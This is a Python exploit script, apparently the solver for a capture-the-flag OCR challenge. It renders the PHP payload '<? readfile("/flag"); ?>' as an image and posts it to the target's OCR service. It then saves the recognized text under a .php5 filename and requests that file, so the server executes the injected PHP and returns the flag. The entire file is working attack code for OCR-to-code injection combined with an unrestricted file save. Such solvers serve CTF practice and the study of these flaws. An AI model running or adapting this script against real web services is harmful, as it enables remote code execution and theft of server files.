#!/usr/bin/env python3
import argparse
import base64
import html
import re
import subprocess
import sys
import tempfile
from pathlib import Path

import requests


def generate_payload_image(path: Path) -> None:
    payload = '<? readfile("/flag"); ?>'
    subprocess.run(
        [
            "convert",
            "-size", "2000x340",
            "xc:white",
            "-fill", "black",
            "-font", "DejaVu-Sans-Mono",
            "-pointsize", "90",
            "-gravity", "center",
            "-annotate", "0",
            payload,
            str(path),
        ],
        check=True,
    )


def extract(pattern: str, body: str, label: str) -> str:
    match = re.search(pattern, body, re.S)
    if not match:
        raise RuntimeError(f"failed to extract {label}")
    return html.unescape(match.group(1))


def main() -> int:
    parser = argparse.ArgumentParser(description="LYKNCTF 2026 OCR solver")
    parser.add_argument("base_url", help="instance URL, e.g. http://host:8080")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    session = requests.Session()

    with tempfile.TemporaryDirectory() as tmp:
        image_path = Path(tmp) / "flag.png"
        generate_payload_image(image_path)

        image_data = base64.b64encode(image_path.read_bytes()).decode()
        response = session.post(
            f"{base}/",
            data={"image_data": f"data:image/png;base64,{image_data}"},
            timeout=30,
        )
        response.raise_for_status()

        ocr_id = extract(
            r'name="ocr_id"\s+value="([^"]+)"',
            response.text,
            "ocr_id",
        )
        recognized = extract(r"<pre>(.*?)</pre>", response.text, "OCR text")

        print(f"[+] OCR ID: {ocr_id}")
        print(f"[+] OCR text: {recognized}")

        expected = '<? readfile("/flag"); ?>'
        if recognized.strip() != expected:
            raise RuntimeError(
                "OCR output differs from payload; adjust font or point size"
            )

        save = session.post(
            f"{base}/",
            data={
                "save_output": "1",
                "ocr_id": ocr_id,
                "filename": "flag.php5",
            },
            timeout=30,
        )
        save.raise_for_status()

        notice = re.search(r'notice [^"]+">([^<]+)', save.text)
        if notice:
            print(f"[+] Save response: {html.unescape(notice.group(1))}")

        result = session.get(f"{base}/saved/flag.php5", timeout=30)
        result.raise_for_status()

        flag = re.search(r"LYKNCTF\{[^}]+\}", result.text)
        if not flag:
            print(result.text)
            raise RuntimeError("flag not found in PHP5 response")

        print(f"[+] Flag: {flag.group(0)}")
        return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (requests.RequestException, subprocess.CalledProcessError, RuntimeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
